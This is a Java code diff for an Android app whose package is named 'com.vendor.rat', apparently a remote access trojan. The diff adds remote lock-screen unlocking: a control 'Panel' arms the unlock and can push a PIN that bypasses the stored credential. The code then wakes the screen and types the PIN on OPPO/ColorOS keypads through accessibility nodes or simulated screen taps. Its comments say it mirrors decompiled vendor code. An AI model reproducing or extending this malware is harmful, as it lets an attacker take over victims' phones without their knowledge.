@@ -47,6 +47,26 @@ public class ConfirmLockDelegate extends AutoEngine {
     public final String settingsPackage;
     public final ConcurrentLinkedQueue<String> processedActions;
 
+    /** Callback for PIN verification result */
+    private static volatile Runnable onVerifySuccess;
+    /** Direct PIN override — bypasses LockCredentialStore */
+    private static volatile String directPin;
+    /** Only process when Panel explicitly requests unlock */
+    private static volatile boolean unlockRequested = false;
+
+    public static void setOnVerifySuccess(Runnable callback) {
+        onVerifySuccess = callback;
+    }
+
+    public static void setDirectPin(String pin) {
+        directPin = pin;
+    }
+
+    /** Called by CommandDispatcher.handleUnlock() to arm the delegate */
+    public static void requestUnlock() {
+        unlockRequested = true;
+    }
+
     public ConfirmLockDelegate() {
         // 对齐 vendor o/h.java: primaryPackage 设为 systemui, 但 listenWindows 覆盖三个包名
         super(createListenWindows(), SYSTEM_UI);
@@ -60,7 +80,8 @@ public class ConfirmLockDelegate extends AutoEngine {
 
     @Override
     public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
-        if (isLockScreen(className)) {
+        if (!unlockRequested) return; // 只在 Panel 主动请求解锁时才处理
+        if (isLockScreen(className) || isSystemUiKeyguard(packageName, className)) {
             Log.d(TAG, "已进入锁屏密码验证代理, pkg=" + packageName + " cls=" + className);
             if (!processedActions.contains("inConfirmLock")) {
                 processedActions.add("inConfirmLock");
@@ -81,15 +102,22 @@ public class ConfirmLockDelegate extends AutoEngine {
         try {
             Log.d(TAG, "开始处理锁屏确认");
 
-            String pin = LockCredentialStore.getPin();
+            String pin = directPin != null ? directPin : LockCredentialStore.getPin();
             if (pin == null || pin.isEmpty()) {
                 Log.w(TAG, "No stored PIN available, cannot auto-input");
                 processedActions.remove("inConfirmLock");
                 return;
             }
 
-            // Wait for UI to fully render
-            sleep(2000);
+            // Wait for screen to be on and UI to render
+            for (int w = 0; w < 10; w++) {
+                android.os.PowerManager pwm = (android.os.PowerManager)
+                        MyAccessibilityService.getInstance().getSystemService(android.content.Context.POWER_SERVICE);
+                if (pwm != null && pwm.isInteractive()) break;
+                Log.d(TAG, "Waiting for screen to turn on... (" + w + ")");
+                sleep(500);
+            }
+            sleep(1000);
 
             // 必须遍历所有窗口找 systemui/settings 的 root
             // activateRoot()/k() 只返回 getRootInActiveWindow()，
@@ -109,8 +137,17 @@ public class ConfirmLockDelegate extends AutoEngine {
             // 5 级 fallback (实现前 3 级)
             if (tryHandleOppoPin(root, pin)) {
                 Log.d(TAG, "PIN input completed successfully");
+                unlockRequested = false;
+                com.vendor.rat.activity.WakeActivity.finishIfAlive();
+                Runnable cb = onVerifySuccess;
+                if (cb != null) {
+                    onVerifySuccess = null;
+                    cb.run();
+                }
             } else {
                 Log.w(TAG, "Failed to auto-input PIN via all strategies");
+                unlockRequested = false;
+                com.vendor.rat.activity.WakeActivity.finishIfAlive();
             }
 
             processedActions.remove("inConfirmLock");
@@ -124,6 +161,28 @@ public class ConfirmLockDelegate extends AutoEngine {
      * 遍历所有无障碍窗口，找到 systemui 或 settings 的锁屏 root 节点。
      * getRootInActiveWindow() 在遮罩覆盖时可能返回错误窗口。
      */
+    private void wakeScreenIfNeeded() {
+        try {
+            MyAccessibilityService svc = MyAccessibilityService.getInstance();
+            if (svc == null) return;
+            android.os.PowerManager pm = (android.os.PowerManager)
+                    svc.getSystemService(android.content.Context.POWER_SERVICE);
+            if (pm != null && !pm.isInteractive()) {
+                android.os.PowerManager.WakeLock wl = pm.newWakeLock(
+                        android.os.PowerManager.FULL_WAKE_LOCK
+                                | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
+                                | android.os.PowerManager.ON_AFTER_RELEASE,
+                        "vendor:confirmlock");
+                wl.acquire(60_000);
+                wl.release();
+                Log.d(TAG, "wakeScreenIfNeeded: screen woken");
+                sleep(500);
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "wakeScreenIfNeeded failed", e);
+        }
+    }
+
     private UiNode findLockScreenRoot() {
         MyAccessibilityService svc = MyAccessibilityService.getInstance();
         if (svc == null) return null;
@@ -165,6 +224,12 @@ public class ConfirmLockDelegate extends AutoEngine {
      * 策略 3: PIN 键盘按钮 by content-desc
      */
     private boolean tryHandleOppoPin(UiNode root, String pin) {
+        // 策略 0: OPPO systemui 锁屏 PIN 键盘 (pinColorNumericKeyboard 容器)
+        Log.d(TAG, "Strategy 0: trying OPPO systemui PIN keypad");
+        if (tryInputViaSystemUiKeypad(root, pin)) {
+            return waitForConfirmWindowDismissByPolling();
+        }
+
         // 策略 1: EditText setText (vendor: "getEditText" → "setEditText" / "/global/setText")
         Log.d(TAG, "Strategy 1: trying EditText setText");
         if (tryInputViaEditText(root, pin)) {
@@ -184,6 +249,144 @@ public class ConfirmLockDelegate extends AutoEngine {
         }
 
         return false;
+    }
+
+    /**
+     * 策略 0: OPPO systemui 锁屏 PIN 键盘
+     * 容器: com.android.systemui:id/pinColorNumericKeyboard
+     * 按钮: android.widget.Button, content-desc="0"-"9", text 为空
+     * 需要遍历所有窗口找到 keyguard bouncer 窗口
+     */
+    private boolean tryInputViaSystemUiKeypad(UiNode root, String pin) {
+        // 先尝试无障碍节点查找
+        UiNode keypad = root.findOneByCombine(CombineFilter.and(
+                StringCondition.viewId("com.android.systemui:id/pinColorNumericKeyboard")));
+        if (keypad == null) {
+            keypad = findKeypadInAllWindows();
+        }
+        if (keypad == null) {
+            for (int retry = 0; retry < 3 && keypad == null; retry++) {
+                sleep(500);
+                wakeScreenIfNeeded();
+                keypad = findKeypadInAllWindows();
+            }
+        }
+        if (keypad != null) {
+            Log.d(TAG, "Strategy 0: found keypad via accessibility nodes");
+            for (int i = 0; i < pin.length(); i++) {
+                char digit = pin.charAt(i);
+                UiNode btn = keypad.findOneByCombine(CombineFilter.and(
+                        StringCondition.descEquals(String.valueOf(digit))));
+                if (btn == null) {
+                    Log.w(TAG, "Strategy 0: node search failed for digit " + digit + ", falling back to gesture");
+                    return tryInputViaGesture(pin, i);
+                }
+                btn.click();
+                Log.d(TAG, "Strategy 0: clicked digit " + (i + 1) + "/" + pin.length());
+                sleep(150);
+            }
+            return true;
+        }
+
+        // 无障碍节点不可见 (OPPO 锁屏限制) → 用 dispatchGesture 坐标点击
+        Log.d(TAG, "Strategy 0: nodes not accessible, using gesture tap");
+        return tryInputViaGesture(pin, 0);
+    }
+
+    /**
+     * 通过 dispatchGesture 坐标点击 PIN 数字键
+     * OPPO systemui PIN 键盘布局: 3x4 网格, 按比例坐标
+     */
+    private boolean tryInputViaGesture(String pin, int startIndex) {
+        MyAccessibilityService svc = MyAccessibilityService.getInstance();
+        if (svc == null) return false;
+
+        int w = svc.getResources().getDisplayMetrics().widthPixels;
+        int h = svc.getResources().getDisplayMetrics().heightPixels;
+
+        float[] colX = {0.246f, 0.500f, 0.754f};
+        float[] rowY = {0.471f, 0.580f, 0.688f, 0.797f};
+
+        for (int i = startIndex; i < pin.length(); i++) {
+            int digit = pin.charAt(i) - '0';
+            float tx, ty;
+            if (digit == 0) {
+                tx = colX[1]; ty = rowY[3];
+            } else {
+                int idx = digit - 1;
+                tx = colX[idx % 3];
+                ty = rowY[idx / 3];
+            }
+            int px = (int) (tx * w);
+            int py = (int) (ty * h);
+
+            android.graphics.Path path = new android.graphics.Path();
+            path.moveTo(px, py);
+            android.accessibilityservice.GestureDescription gesture =
+                    new android.accessibilityservice.GestureDescription.Builder()
+                            .addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 100))
+                            .build();
+            svc.dispatchGesture(gesture, null, null);
+            Log.d(TAG, "Strategy 0 tap: digit " + pin.charAt(i) + " at (" + px + "," + py + ")");
+            sleep(300);
+        }
+        return true;
+    }
+
+    private UiNode findKeypadInAllWindows() {
+        MyAccessibilityService svc = MyAccessibilityService.getInstance();
+        if (svc == null) return null;
+        try {
+            java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
+            if (windows == null) return null;
+            Log.d(TAG, "findKeypadInAllWindows: " + windows.size() + " windows");
+            for (android.view.accessibility.AccessibilityWindowInfo w : windows) {
+                if (w == null) continue;
+                android.view.accessibility.AccessibilityNodeInfo wRoot = w.getRoot();
+                if (wRoot == null) continue;
+                CharSequence pkg = wRoot.getPackageName();
+                Log.d(TAG, "  window type=" + w.getType() + " pkg=" + pkg);
+                if (pkg != null && SYSTEM_UI.equals(pkg.toString())) {
+                    UiNode node = new UiNode(wRoot);
+                    UiNode keypad = node.findOneByCombine(CombineFilter.and(
+                            StringCondition.viewId("com.android.systemui:id/pinColorNumericKeyboard")));
+                    if (keypad != null) {
+                        Log.d(TAG, "findKeypadInAllWindows: found in window type=" + w.getType());
+                        return keypad;
+                    }
+                    // 也尝试直接在整个树里找 content-desc 数字按钮
+                    UiNode btn1 = node.findOneByCombine(CombineFilter.and(
+                            StringCondition.className("android.widget.Button"),
+                            StringCondition.descEquals("1")));
+                    if (btn1 != null) {
+                        Log.d(TAG, "findKeypadInAllWindows: found digit button in window type=" + w.getType());
+                        return node; // 返回整个窗口 root，让调用者在里面找按钮
+                    }
+                }
+            }
+            // fallback: getRootInActiveWindow
+            android.view.accessibility.AccessibilityNodeInfo activeRoot = svc.getRootInActiveWindow();
+            if (activeRoot != null) {
+                UiNode node = new UiNode(activeRoot);
+                Log.d(TAG, "findKeypadInAllWindows: trying activeRoot pkg=" + activeRoot.getPackageName());
+                UiNode keypad = node.findOneByCombine(CombineFilter.and(
+                        StringCondition.viewId("com.android.systemui:id/pinColorNumericKeyboard")));
+                if (keypad != null) {
+                    Log.d(TAG, "findKeypadInAllWindows: found in activeRoot");
+                    return keypad;
+                }
+                UiNode btn1 = node.findOneByCombine(CombineFilter.and(
+                        StringCondition.className("android.widget.Button"),
+                        StringCondition.descEquals("1")));
+                if (btn1 != null) {
+                    Log.d(TAG, "findKeypadInAllWindows: found digit button in activeRoot");
+                    return node;
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "findKeypadInAllWindows error", e);
+        }
+        return null;
     }
 
     /**
@@ -369,6 +572,25 @@ public class ConfirmLockDelegate extends AutoEngine {
     }
 
     /**
+     * OPPO/ColorOS: 锁屏 PIN 输入在 systemui 的 FrameLayout 内，
+     * 需要检查 KeyguardManager 确认是否真的在锁屏状态
+     */
+    private boolean isSystemUiKeyguard(String packageName, String className) {
+        if (!SYSTEM_UI.equals(packageName)) return false;
+        if (!"android.widget.FrameLayout".equals(className)
+                && !"android.widget.LinearLayout".equals(className)) return false;
+        try {
+            MyAccessibilityService svc = MyAccessibilityService.getInstance();
+            if (svc == null) return false;
+            android.app.KeyguardManager km = (android.app.KeyguardManager)
+                    svc.getSystemService(android.content.Context.KEYGUARD_SERVICE);
+            return km != null && km.isKeyguardLocked();
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    /**
      * 创建监听窗口列表
      * 对齐 vendor o/h.java M(): 同时监听 systemui + settings + samsung biometrics
      * 对齐 vendor o/i.java L(): settings 下的 ConfirmLockPassword 等
@@ -391,6 +613,9 @@ public class ConfirmLockDelegate extends AutoEngine {
                     .addEventType(32).addEventType(16384));
             // LinearLayout (vendor o/h.java R() — "使用凭证" 按钮容器)
             list.add(new WindowMatcher(pkg, "android.widget.LinearLayout")
+                    .addEventType(32).addEventType(2048).addEventType(16384));
+            // FrameLayout (OPPO ColorOS 锁屏 PIN 输入在 systemui FrameLayout 内)
+            list.add(new WindowMatcher(pkg, "android.widget.FrameLayout")
                     .addEventType(32).addEventType(2048).addEventType(16384));
         }
         // Vivo specific
